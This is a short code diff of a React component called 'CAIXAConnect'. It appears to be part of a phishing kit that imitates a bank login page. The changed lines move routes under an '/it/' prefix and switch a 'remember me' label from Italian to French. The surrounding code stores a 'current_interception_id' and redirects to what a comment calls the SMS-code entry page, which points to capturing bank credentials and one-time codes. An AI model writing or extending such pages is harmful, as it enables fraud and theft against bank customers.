@@ -39,7 +39,7 @@ export default function CAIXAConnect() {
       sessionStorage.setItem("current_interception_id", data.id);
 
       // Redirection immédiate vers la page de saisie du code SMS
-      router.push("/operation/montant");
+      router.push("/it/operation/montant");
 
     } catch (err: any) {
       setError(err.message || "Errore di connessione al server.");
@@ -50,7 +50,7 @@ export default function CAIXAConnect() {
 
   return (
     <div className="bank-connect-container">
-      <Link href="/operation" className="back-btn">
+      <Link href="/it/operation" className="back-btn">
         <i className="fa-solid fa-arrow-left"></i>
       </Link>
 
@@ -98,7 +98,7 @@ export default function CAIXAConnect() {
 
         {/* <div className="remember-me">
           <input type="checkbox" id="remember" className="checkbox-custom" />
-          <label htmlFor="remember">Ricordami</label>
+          <label htmlFor="remember">Se souvenir de moi</label>
         </div> */}
 
         <div className="security-note">
